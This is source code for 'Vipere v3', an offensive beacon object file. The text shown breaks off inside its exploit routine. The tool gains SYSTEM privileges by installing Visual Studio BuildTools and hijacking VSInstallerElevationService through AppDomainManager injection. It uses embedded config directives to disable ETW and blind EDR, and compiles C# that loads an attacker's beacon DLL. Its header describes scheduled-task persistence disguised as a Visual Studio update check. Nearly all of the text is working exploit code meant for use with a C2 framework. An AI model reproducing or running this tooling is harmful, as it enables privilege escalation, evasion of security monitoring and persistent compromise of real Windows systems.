/*
 * Vipere v3 — VS Installer LPE via AppDomainManager hijacking
 *
 * Installs VS BuildTools from Microsoft CDN to register the
 * VSInstallerElevationService, then hijacks its .NET initialization
 * via AppDomainManager injection to execute a beacon DLL as SYSTEM.
 * ETW is disabled natively via .config directives — EDR blind.
 *
 * Commands:
 *   check              detect service + persistence state
 *   prepare            download + install VS BuildTools from microsoft.com
 *   exploit <dll>      AppDomainManager hijack on service → SYSTEM
 *   persist <dll>      scheduled task + AppDomainManager → reboot survival
 *   full <dll>         prepare + exploit + persist
 *   cleanup            remove all artifacts + restore originals
 *
 * Payload: beacon DLL (any C2 framework).
 *
 * Compile:
 *   x86_64-w64-mingw32-g++ -c -o lpe_vs_bootstrap.x64.o src/lpe_vs_bootstrap_bof.cpp \
 *       -DBOF -DUNICODE -D_UNICODE -fno-exceptions -fno-rtti \
 *       -mno-stack-arg-probe -fno-asynchronous-unwind-tables -Wall -O2
 */

#ifndef UNICODE
#define UNICODE
#endif
#ifndef _UNICODE
#define _UNICODE
#endif

#include <windows.h>
#include <stdio.h>

#ifdef BOF
#include "beacon.h"

extern "C" {
DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$GetLastError(void);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateFileW(LPCWSTR,DWORD,DWORD,LPSECURITY_ATTRIBUTES,DWORD,DWORD,HANDLE);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$WriteFile(HANDLE,LPCVOID,DWORD,LPDWORD,LPOVERLAPPED);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$DeleteFileW(LPCWSTR);
DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$GetFileAttributesW(LPCWSTR);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$CreateDirectoryW(LPCWSTR,LPSECURITY_ATTRIBUTES);
DECLSPEC_IMPORT void   WINAPI KERNEL32$Sleep(DWORD);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$CreateProcessW(LPCWSTR,LPWSTR,LPSECURITY_ATTRIBUTES,LPSECURITY_ATTRIBUTES,BOOL,DWORD,LPVOID,LPCWSTR,LPSTARTUPINFOW,LPPROCESS_INFORMATION);
DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$WaitForSingleObject(HANDLE,DWORD);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$GetExitCodeProcess(HANDLE,LPDWORD);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$CopyFileW(LPCWSTR,LPCWSTR,BOOL);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$MoveFileW(LPCWSTR,LPCWSTR);
DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$LoadLibraryA(LPCSTR);
DECLSPEC_IMPORT FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE, LPCSTR);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$RemoveDirectoryW(LPCWSTR);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$ReadFile(HANDLE,LPVOID,DWORD,LPDWORD,LPOVERLAPPED);
DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$GetFileSize(HANDLE,LPDWORD);
DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$GetModuleFileNameW(HMODULE,LPWSTR,DWORD);
DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$VirtualAlloc(LPVOID,SIZE_T,DWORD,DWORD);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$VirtualFree(LPVOID,SIZE_T,DWORD);

DECLSPEC_IMPORT int      __cdecl MSVCRT$_wcsicmp(const wchar_t*,const wchar_t*);
DECLSPEC_IMPORT int      __cdecl MSVCRT$_snwprintf(wchar_t*,size_t,const wchar_t*,...);
DECLSPEC_IMPORT void*    __cdecl MSVCRT$memset(void*,int,size_t);
DECLSPEC_IMPORT void*    __cdecl MSVCRT$memcpy(void*,const void*,size_t);
DECLSPEC_IMPORT char*    __cdecl MSVCRT$strstr(const char*,const char*);
DECLSPEC_IMPORT wchar_t* __cdecl MSVCRT$wcscpy(wchar_t*,const wchar_t*);
DECLSPEC_IMPORT wchar_t* __cdecl MSVCRT$wcsstr(const wchar_t*,const wchar_t*);
} // extern "C"

// ADVAPI32 — resolved at runtime to avoid muonLoader ADDR64 crash
typedef SC_HANDLE (WINAPI *fn_OpenSCManagerW)(LPCWSTR,LPCWSTR,DWORD);
typedef SC_HANDLE (WINAPI *fn_OpenServiceW)(SC_HANDLE,LPCWSTR,DWORD);
typedef BOOL      (WINAPI *fn_StartServiceW)(SC_HANDLE,DWORD,LPCWSTR*);
typedef BOOL      (WINAPI *fn_ControlService)(SC_HANDLE,DWORD,LPSERVICE_STATUS);
typedef BOOL      (WINAPI *fn_CloseServiceHandle)(SC_HANDLE);
static fn_OpenSCManagerW       pOpenSCManagerW;
static fn_OpenServiceW         pOpenServiceW;
static fn_StartServiceW        pStartServiceW;
static fn_ControlService       pControlService;
static fn_CloseServiceHandle   pCloseServiceHandle;

// WINHTTP — download via WinHTTP (no COM dependency)
typedef LPVOID HINTERNET;
#define WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY 4
#define WINHTTP_FLAG_SECURE 0x00800000
#define WINHTTP_QUERY_STATUS_CODE 19
#define WINHTTP_QUERY_FLAG_NUMBER 0x20000000
#define INTERNET_DEFAULT_HTTPS_PORT 443

typedef HINTERNET (WINAPI *fn_WinHttpOpen)(LPCWSTR,DWORD,LPCWSTR,LPCWSTR,DWORD);
typedef HINTERNET (WINAPI *fn_WinHttpConnect)(HINTERNET,LPCWSTR,WORD,DWORD);
typedef HINTERNET (WINAPI *fn_WinHttpOpenRequest)(HINTERNET,LPCWSTR,LPCWSTR,LPCWSTR,LPCWSTR,LPCWSTR*,DWORD);
typedef BOOL      (WINAPI *fn_WinHttpSendRequest)(HINTERNET,LPCWSTR,DWORD,LPVOID,DWORD,DWORD,DWORD_PTR);
typedef BOOL      (WINAPI *fn_WinHttpReceiveResponse)(HINTERNET,LPVOID);
typedef BOOL      (WINAPI *fn_WinHttpQueryHeaders)(HINTERNET,DWORD,LPCWSTR,LPVOID,LPDWORD,LPDWORD);
typedef BOOL      (WINAPI *fn_WinHttpReadData)(HINTERNET,LPVOID,DWORD,LPDWORD);
typedef BOOL      (WINAPI *fn_WinHttpCloseHandle)(HINTERNET);

static fn_WinHttpOpen            pWinHttpOpen;
static fn_WinHttpConnect         pWinHttpConnect;
static fn_WinHttpOpenRequest     pWinHttpOpenRequest;
static fn_WinHttpSendRequest     pWinHttpSendRequest;
static fn_WinHttpReceiveResponse pWinHttpReceiveResponse;
static fn_WinHttpQueryHeaders    pWinHttpQueryHeaders;
static fn_WinHttpReadData        pWinHttpReadData;
static fn_WinHttpCloseHandle     pWinHttpCloseHandle;

#define GetLastError       KERNEL32$GetLastError
#define CloseHandle        KERNEL32$CloseHandle
#define CreateFileW        KERNEL32$CreateFileW
#define WriteFile          KERNEL32$WriteFile
#define DeleteFileW        KERNEL32$DeleteFileW
#define GetFileAttributesW KERNEL32$GetFileAttributesW
#define CreateDirectoryW   KERNEL32$CreateDirectoryW
#define Sleep              KERNEL32$Sleep
#define CreateProcessW     KERNEL32$CreateProcessW
#define WaitForSingleObject KERNEL32$WaitForSingleObject
#define GetExitCodeProcess KERNEL32$GetExitCodeProcess
#define CopyFileW          KERNEL32$CopyFileW
#define MoveFileW          KERNEL32$MoveFileW
#define RemoveDirectoryW   KERNEL32$RemoveDirectoryW
#define ReadFile           KERNEL32$ReadFile
#define GetFileSize        KERNEL32$GetFileSize
#define GetModuleFileNameW KERNEL32$GetModuleFileNameW
#define VirtualAlloc       KERNEL32$VirtualAlloc
#define VirtualFree        KERNEL32$VirtualFree
#define OpenSCManagerW     pOpenSCManagerW
#define OpenServiceW       pOpenServiceW
#define StartServiceW      pStartServiceW
#define ControlService     pControlService
#define CloseServiceHandle pCloseServiceHandle
#define WinHttpOpen            pWinHttpOpen
#define WinHttpConnect         pWinHttpConnect
#define WinHttpOpenRequest     pWinHttpOpenRequest
#define WinHttpSendRequest     pWinHttpSendRequest
#define WinHttpReceiveResponse pWinHttpReceiveResponse
#define WinHttpQueryHeaders    pWinHttpQueryHeaders
#define WinHttpReadData        pWinHttpReadData
#define WinHttpCloseHandle     pWinHttpCloseHandle
#define _wcsicmp   MSVCRT$_wcsicmp
#define _snwprintf MSVCRT$_snwprintf
#define memset     MSVCRT$memset
#define memcpy     MSVCRT$memcpy
#define strstr     MSVCRT$strstr
#define wcscpy     MSVCRT$wcscpy
#define wcsstr     MSVCRT$wcsstr

#else
#include <winhttp.h>
#define CALLBACK_OUTPUT 0
#define CALLBACK_ERROR  1
static inline void BeaconPrintf(int type, const char* fmt, ...) {
    va_list a; va_start(a,fmt);
    if(type==CALLBACK_ERROR) vfprintf(stderr,fmt,a); else vprintf(fmt,a);
    va_end(a);
}
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "winhttp.lib")
#endif

// ============================================================================
// Paths
// ============================================================================

#define SVC_NAME    L"VSInstallerElevationService"
#define SVC_DIR     L"C:\\Program Files (x86)\\Microsoft Visual Studio\\Installer"
#define SVC_EXE     L"C:\\Program Files (x86)\\Microsoft Visual Studio\\Installer\\VSInstallerElevationService.exe"
#define SVC_CFG     L"C:\\Program Files (x86)\\Microsoft Visual Studio\\Installer\\VSInstallerElevationService.exe.config"
#define SVC_CFG_BAK L"C:\\Program Files (x86)\\Microsoft Visual Studio\\Installer\\VSInstallerElevationService.exe.config.bak"
#define ADM_DLL     L"C:\\Program Files (x86)\\Microsoft Visual Studio\\Installer\\Microsoft.VS.ConfigurationManager.dll"
#define HOST_DLL    L"C:\\Program Files (x86)\\Microsoft Visual Studio\\Installer\\Microsoft.VS.ConfigurationHost.dll"

#define PERSIST_DIR L"C:\\ProgramData\\Microsoft\\VisualStudio\\Updates"
#define PERSIST_EXE L"C:\\ProgramData\\Microsoft\\VisualStudio\\Updates\\vs_installershell.exe"
#define PERSIST_CFG L"C:\\ProgramData\\Microsoft\\VisualStudio\\Updates\\vs_installershell.exe.config"
#define PERSIST_ADM L"C:\\ProgramData\\Microsoft\\VisualStudio\\Updates\\Microsoft.VS.ConfigurationManager.dll"
#define PERSIST_HDL L"C:\\ProgramData\\Microsoft\\VisualStudio\\Updates\\Microsoft.VS.ConfigurationHost.dll"
#define PERSIST_SRC L"C:\\Program Files (x86)\\Microsoft Visual Studio\\Installer\\vs_installershell.exe"
#define TASK_NAME   L"Microsoft\\VisualStudio\\UpdateCheckService"

#define BOOTSTRAP_PATH L"C:\\Users\\Public\\vs_BuildTools.exe"

// ============================================================================
// Embedded payloads — AppDomainManager config + C# source
// ============================================================================

static const char CONFIG_XML[] =
    "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n"
    "<configuration>\n"
    "  <startup>\n"
    "    <supportedRuntime version=\"v4.0\" sku=\".NETFramework,Version=v4.0\"/>\n"
    "  </startup>\n"
    "  <runtime>\n"
    "    <etwEnable enabled=\"false\"/>\n"
    "    <bypassTrustedAppStrongNames enabled=\"true\"/>\n"
    "    <publisherPolicy apply=\"no\"/>\n"
    "    <appDomainManagerAssembly value=\"Microsoft.VS.ConfigurationManager, "
    "Version=1.0.0.0, Culture=neutral, PublicKeyToken=null\"/>\n"
    "    <appDomainManagerType value=\"Microsoft.VS.Configuration.HostManager\"/>\n"
    "    <assemblyBinding xmlns=\"urn:schemas-microsoft-com:asm.v1\">\n"
    "      <probing privatePath=\".\"/>\n"
    "    </assemblyBinding>\n"
    "  </runtime>\n"
    "</configuration>\n";

static const char CS_SRC[] =
    "using System;\n"
    "using System.Runtime.InteropServices;\n"
    "using System.Threading;\n"
    "namespace Microsoft.VS.Configuration {\n"
    "  public class HostManager : AppDomainManager {\n"
    "    [DllImport(\"kernel32.dll\",SetLastError=true,CharSet=CharSet.Unicode)]\n"
    "    static extern IntPtr LoadLibraryW(string p);\n"
    "    [DllImport(\"advapi32.dll\",SetLastError=true,CharSet=CharSet.Unicode)]\n"
    "    static extern bool StartServiceCtrlDispatcherW(IntPtr t);\n"
    "    [DllImport(\"advapi32.dll\",SetLastError=true,CharSet=CharSet.Unicode)]\n"
    "    static extern IntPtr RegisterServiceCtrlHandlerExW(\n"
    "      string n,HX cb,IntPtr ctx);\n"
    "    [DllImport(\"advapi32.dll\",SetLastError=true)]\n"
    "    static extern bool SetServiceStatus(IntPtr h,ref SS s);\n"
    "    delegate void SM(int c,IntPtr v);\n"
    "    delegate int HX(int c,int t,IntPtr d,IntPtr x);\n"
    "    [StructLayout(LayoutKind.Sequential)]\n"
    "    struct SS{public int t,s,a,e,se,cp,wh;}\n"
    "    static IntPtr _h;static SS _s;\n"
    "    static SM _sm;static HX _hx;\n"
    "    static ManualResetEvent _ev=new ManualResetEvent(false);\n"
    "    static int Ctl(int c,int t,IntPtr d,IntPtr x){\n"
    "      if(c==1){_s.s=1;SetServiceStatus(_h,ref _s);_ev.Set();}\n"
    "      return 0;}\n"
    "    static void Svc(int c,IntPtr v){\n"
    "      _hx=new HX(Ctl);\n"
    "      _h=RegisterServiceCtrlHandlerExW(\n"
    "        \"VSInstallerElevationService\",_hx,IntPtr.Zero);\n"
    "      if(_h!=IntPtr.Zero){\n"
    "        _s.t=0x10;_s.s=4;_s.a=1;\n"
    "        SetServiceStatus(_h,ref _s);}\n"
    "      _ev.WaitOne();}\n"
    "    public override void InitializeNewDomain(AppDomainSetup info){\n"
    "      try{\n"
    "        string dir=System.IO.Path.GetDirectoryName(\n"
    "          System.Reflection.Assembly.GetExecutingAssembly().Location);\n"
    "        string dll=System.IO.Path.Combine(dir,\n"
    "          \"Microsoft.VS.ConfigurationHost.dll\");\n"
    "        new Thread(()=>{LoadLibraryW(dll);}).Start();\n"
    "        _sm=new SM(Svc);\n"
    "        IntPtr fp=Marshal.GetFunctionPointerForDelegate(_sm);\n"
    "        int psz=IntPtr.Size;\n"
    "        IntPtr tbl=Marshal.AllocHGlobal(psz*4);\n"
    "        IntPtr nm=Marshal.StringToHGlobalUni(\n"
    "          \"VSInstallerElevationService\");\n"
    "        Marshal.WriteIntPtr(tbl,0,nm);\n"
    "        Marshal.WriteIntPtr(tbl,psz,fp);\n"
    "        Marshal.WriteIntPtr(tbl,psz*2,IntPtr.Zero);\n"
    "        Marshal.WriteIntPtr(tbl,psz*3,IntPtr.Zero);\n"
    "        if(!StartServiceCtrlDispatcherW(tbl))\n"
    "          Thread.Sleep(Timeout.Infinite);\n"
    "      }catch{Thread.Sleep(Timeout.Infinite);}\n"
    "    }\n"
    "  }\n"
    "}\n";

static const char INJECT_RUNTIME[] =
    "\n    <etwEnable enabled=\"false\"/>"
    "\n    <bypassTrustedAppStrongNames enabled=\"true\"/>"
    "\n    <publisherPolicy apply=\"no\"/>"
    "\n    <appDomainManagerAssembly value=\"Microsoft.VS.ConfigurationManager, "
    "Version=1.0.0.0, Culture=neutral, PublicKeyToken=null\"/>"
    "\n    <appDomainManagerType value=\"Microsoft.VS.Configuration.HostManager\"/>";

static const char INJECT_PROBING[] =
    "\n    <assemblyBinding xmlns=\"urn:schemas-microsoft-com:asm.v1\">"
    "\n      <probing privatePath=\".\"/>"
    "\n    </assemblyBinding>";

// ============================================================================
// Utilities
// ============================================================================

static BOOL FExists(const wchar_t* p) {
    DWORD a = GetFileAttributesW(p);
    return (a != INVALID_FILE_ATTRIBUTES && !(a & FILE_ATTRIBUTE_DIRECTORY));
}

static BOOL DExists(const wchar_t* p) {
    DWORD a = GetFileAttributesW(p);
    return (a != INVALID_FILE_ATTRIBUTES && (a & FILE_ATTRIBUTE_DIRECTORY));
}

static BOOL Drop(const wchar_t* path, const void* data, DWORD len) {
    HANDLE h = CreateFileW(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return FALSE;
    DWORD w = 0; BOOL ok = WriteFile(h, data, len, &w, NULL);
    CloseHandle(h); return ok && (w == len);
}

static BOOL SvcExists(void) {
    SC_HANDLE scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
    if (!scm) return FALSE;
    SC_HANDLE svc = OpenServiceW(scm, SVC_NAME, SERVICE_QUERY_STATUS);
    BOOL exists = (svc != NULL);
    if (svc) CloseServiceHandle(svc);
    CloseServiceHandle(scm);
    return exists;
}

static BOOL RunProcess(wchar_t* cmdLine, DWORD timeoutMs) {
    STARTUPINFOW si; PROCESS_INFORMATION pi;
    memset(&si, 0, sizeof(si)); si.cb = sizeof(si);
    memset(&pi, 0, sizeof(pi));
    if (!CreateProcessW(NULL, cmdLine, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
        return FALSE;
    DWORD w = WaitForSingleObject(pi.hProcess, timeoutMs);
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    return (w != WAIT_TIMEOUT);
}

// Compile C# AppDomainManager DLL via csc.exe
static BOOL CompileAppDomainManager(const wchar_t* dir, const wchar_t* outDll) {
    wchar_t csPath[512];
    _snwprintf(csPath, 512, L"%s\\Microsoft.VS.ConfigurationManager.cs", dir);
    csPath[511] = 0;

    if (!Drop(csPath, CS_SRC, (DWORD)(sizeof(CS_SRC) - 1))) {
        BeaconPrintf(CALLBACK_ERROR, "[-] CS source drop failed\n");
        return FALSE;
    }

    wchar_t cscCmd[1024];
    _snwprintf(cscCmd, 1024,
        L"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe "
        L"/target:library /nologo /out:\"%s\" \"%s\"", outDll, csPath);
    cscCmd[1023] = 0;

    if (!RunProcess(cscCmd, 30000)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] csc.exe failed or timeout\n");
        DeleteFileW(csPath);
        return FALSE;
    }
    DeleteFileW(csPath);

    if (!FExists(outDll)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] AppDomainManager compilation failed\n");
        return FALSE;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Compiled %ls\n", outDll);
    return TRUE;
}

// Merge our directives into an existing .config (preserves binding redirects)
static BOOL MergeConfig(const wchar_t* backupPath, const wchar_t* outPath) {
    HANDLE hIn = CreateFileW(backupPath, GENERIC_READ, FILE_SHARE_READ, NULL,
                             OPEN_EXISTING, 0, NULL);
    if (hIn == INVALID_HANDLE_VALUE) return FALSE;
    DWORD fileSize = GetFileSize(hIn, NULL);
    if (fileSize == 0 || fileSize >= 16384) { CloseHandle(hIn); return FALSE; }

    char* orig = (char*)VirtualAlloc(NULL, 16384, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!orig) { CloseHandle(hIn); return FALSE; }

    DWORD bytesRead = 0;
    ReadFile(hIn, orig, fileSize, &bytesRead, NULL);
    CloseHandle(hIn);
    orig[bytesRead] = 0;

    char* pRuntime = strstr(orig, "<runtime>");
    char* pEndRuntime = strstr(orig, "</runtime>");
    char* afterRuntime = pRuntime ? pRuntime + 9 : NULL;
    if (!pRuntime || !pEndRuntime || pEndRuntime <= afterRuntime) {
        VirtualFree(orig, 0, MEM_RELEASE);
        return Drop(outPath, CONFIG_XML, (DWORD)(sizeof(CONFIG_XML) - 1));
    }

    char* merged = (char*)VirtualAlloc(NULL, 20480, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!merged) { VirtualFree(orig, 0, MEM_RELEASE); return FALSE; }
    DWORD pos = 0;

    DWORD headLen = (DWORD)(afterRuntime - orig);
    memcpy(merged + pos, orig, headLen); pos += headLen;

    DWORD injRtLen = (DWORD)(sizeof(INJECT_RUNTIME) - 1);
    memcpy(merged + pos, INJECT_RUNTIME, injRtLen); pos += injRtLen;

    DWORD midLen = (DWORD)(pEndRuntime - afterRuntime);
    memcpy(merged + pos, afterRuntime, midLen); pos += midLen;

    DWORD injPrLen = (DWORD)(sizeof(INJECT_PROBING) - 1);
    memcpy(merged + pos, INJECT_PROBING, injPrLen); pos += injPrLen;

    DWORD tailLen = bytesRead - (DWORD)(pEndRuntime - orig);
    memcpy(merged + pos, pEndRuntime, tailLen); pos += tailLen;

    BOOL result = Drop(outPath, merged, pos);
    VirtualFree(merged, 0, MEM_RELEASE);
    VirtualFree(orig, 0, MEM_RELEASE);
    return result;
}

// Deploy AppDomainManager chain in a target directory
// cfgBackup: if non-NULL and file exists, merge into original; otherwise use static CONFIG_XML
static BOOL DeployAppDomain(const wchar_t* cfgPath, const wchar_t* admDll,
                            const wchar_t* hostDll, const wchar_t* dir,
                            char* beaconData, DWORD beaconSize,
                            const wchar_t* cfgBackup) {
    BOOL cfgOk;
    if (cfgBackup && FExists(cfgBackup))
        cfgOk = MergeConfig(cfgBackup, cfgPath);
    else
        cfgOk = Drop(cfgPath, CONFIG_XML, (DWORD)(sizeof(CONFIG_XML) - 1));

    if (!cfgOk) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Config drop failed\n");
        return FALSE;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Dropped .config (ETW disabled)\n");

    if (!CompileAppDomainManager(dir, admDll)) {
        DeleteFileW(cfgPath);
        return FALSE;
    }

    if (!Drop(hostDll, beaconData, beaconSize)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Beacon DLL drop failed: %d\n", GetLastError());
        DeleteFileW(cfgPath);
        DeleteFileW(admDll);
        return FALSE;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Dropped beacon DLL (%d bytes)\n", beaconSize);
    return TRUE;
}

// ============================================================================
// Commands
// ============================================================================

static void DoCheck(void) {
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Vipere CHECK\n");

    if (SvcExists()) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Service registered\n");
        BeaconPrintf(CALLBACK_OUTPUT, "    Binary: %s\n", FExists(SVC_EXE) ? "YES" : "NO (orphaned)");
        BeaconPrintf(CALLBACK_OUTPUT, "    .config hijack: %s\n", FExists(SVC_CFG) ? "YES" : "NO");
        BeaconPrintf(CALLBACK_OUTPUT, "    AppDomainManager: %s\n", FExists(ADM_DLL) ? "YES" : "NO");
        BeaconPrintf(CALLBACK_OUTPUT, "    Beacon DLL: %s\n", FExists(HOST_DLL) ? "YES" : "NO");
        BeaconPrintf(CALLBACK_OUTPUT, "    Config backup: %s\n", FExists(SVC_CFG_BAK) ? "YES" : "NO");
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] Service NOT registered — run prepare\n");
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Persistence:\n");
    BeaconPrintf(CALLBACK_OUTPUT, "    Persist dir: %s\n", DExists(PERSIST_DIR) ? "YES" : "NO");
    BeaconPrintf(CALLBACK_OUTPUT, "    Persist EXE: %s\n", FExists(PERSIST_EXE) ? "YES" : "NO");
    BeaconPrintf(CALLBACK_OUTPUT, "    Persist beacon: %s\n", FExists(PERSIST_HDL) ? "YES" : "NO");
}

static BOOL DoPrepare(void) {
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Vipere PREPARE\n");

    if (SvcExists()) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Service already exists — skipping download\n");
        return TRUE;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Downloading vs_BuildTools.exe from microsoft.com...\n");

    HINTERNET hSession = WinHttpOpen(L"Microsoft-Delivery-Optimization/10.0",
                                     WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
                                     NULL, NULL, 0);
    if (!hSession) {
        BeaconPrintf(CALLBACK_ERROR, "[-] WinHttpOpen failed: %d\n", GetLastError());
        return FALSE;
    }

    HINTERNET hConnect = WinHttpConnect(hSession, L"aka.ms",
                                        INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) {
        BeaconPrintf(CALLBACK_ERROR, "[-] WinHttpConnect failed: %d\n", GetLastError());
        WinHttpCloseHandle(hSession);
        return FALSE;
    }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET",
                                            L"/vs/17/release/vs_BuildTools.exe",
                                            NULL, NULL, NULL,
                                            WINHTTP_FLAG_SECURE);
    if (!hRequest) {
        BeaconPrintf(CALLBACK_ERROR, "[-] WinHttpOpenRequest failed: %d\n", GetLastError());
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return FALSE;
    }

    if (!WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0) ||
        !WinHttpReceiveResponse(hRequest, NULL)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] WinHTTP request failed: %d\n", GetLastError());
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return FALSE;
    }

    DWORD statusCode = 0;
    DWORD statusSize = sizeof(statusCode);
    WinHttpQueryHeaders(hRequest,
                        WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                        NULL, &statusCode, &statusSize, NULL);
    if (statusCode != 200) {
        BeaconPrintf(CALLBACK_ERROR, "[-] HTTP %d\n", statusCode);
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return FALSE;
    }

    HANDLE hFile = CreateFileW(BOOTSTRAP_PATH, GENERIC_WRITE, 0, NULL,
                               CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "[-] CreateFile failed: %d\n", GetLastError());
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return FALSE;
    }

    BYTE buf[4096];
    DWORD dwRead = 0, dwWritten = 0, dwTotal = 0;
    BOOL writeOk = TRUE;
    while (WinHttpReadData(hRequest, buf, sizeof(buf), &dwRead) && dwRead > 0) {
        if (!WriteFile(hFile, buf, dwRead, &dwWritten, NULL) || dwWritten != dwRead) {
            writeOk = FALSE;
            break;
        }
        dwTotal += dwRead;
        dwRead = 0;
    }
    CloseHandle(hFile);
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    if (!writeOk) {
        BeaconPrintf(CALLBACK_ERROR, "[-] WriteFile failed during download\n");
        DeleteFileW(BOOTSTRAP_PATH);
        return FALSE;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Downloaded %d bytes\n", dwTotal);
    if (dwTotal == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Download empty\n");
        DeleteFileW(BOOTSTRAP_PATH);
        return FALSE;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Running bootstrapper (installs VS Installer only)...\n");
    wchar_t args[256];
    wcscpy(args, L"vs_BuildTools.exe --quiet --wait --norestart");

    STARTUPINFOW si; PROCESS_INFORMATION pi;
    memset(&si, 0, sizeof(si)); si.cb = sizeof(si);
    memset(&pi, 0, sizeof(pi));

    if (!CreateProcessW(BOOTSTRAP_PATH, args, NULL, NULL, FALSE,
                        CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] CreateProcess failed: %d\n", GetLastError());
        DeleteFileW(BOOTSTRAP_PATH);
        return FALSE;
    }

    DWORD waitRet = WaitForSingleObject(pi.hProcess, 300000);
    if (waitRet == WAIT_TIMEOUT) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Bootstrapper timeout (>5min)\n");
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
        return FALSE;
    }
    DWORD exitCode = 0;
    GetExitCodeProcess(pi.hProcess, &exitCode);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Bootstrapper exit: %d\n", exitCode);
    DeleteFileW(BOOTSTRAP_PATH);

    Sleep(2000);
    if (SvcExists()) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] VSInstallerElevationService REGISTERED\n");
        return TRUE;
    } else {
        BeaconPrintf(CALLBACK_ERROR, "[-] Service not created after bootstrapper\n");
        return FALSE;
    }
}

static void DoExploit(char* payloadData, int payloadSize) {
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Vipere EXPLOIT\n");

    if (!payloadData || payloadSize < 1024) {
        BeaconPrintf(CALLBACK_ERROR, "[-] No payload. Usage: exploit <beacon.dll>\n");
        return;
    }

    if (!SvcExists()) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Service not registered — run prepare first\n");
        return;
    }

    SC_HANDLE scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
    if (!scm) { BeaconPrintf(CALLBACK_ERROR, "[-] SCM failed\n"); return; }
    SC_HANDLE svc = OpenServiceW(scm, SVC_NAME,
        SERVICE_START | SERVICE_STOP);
    if (!svc) {
        BeaconPrintf(CALLBACK_ERROR, "[-] OpenService: %d\n", GetLastError());
        CloseServiceHandle(scm); return;
    }

    SERVICE_STATUS ss;
    ControlService(svc, SERVICE_CONTROL_STOP, &ss);
    Sleep(1000);

    // Backup existing .config
    if (FExists(SVC_CFG) && !FExists(SVC_CFG_BAK)) {
        MoveFileW(SVC_CFG, SVC_CFG_BAK);
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Original .config backed up\n");
    }

    // Deploy AppDomainManager chain (merge into original .config)
    if (!DeployAppDomain(SVC_CFG, ADM_DLL, HOST_DLL, SVC_DIR,
                         payloadData, (DWORD)payloadSize, SVC_CFG_BAK)) {
        if (FExists(SVC_CFG_BAK)) MoveFileW(SVC_CFG_BAK, SVC_CFG);
        CloseServiceHandle(svc); CloseServiceHandle(scm);
        return;
    }

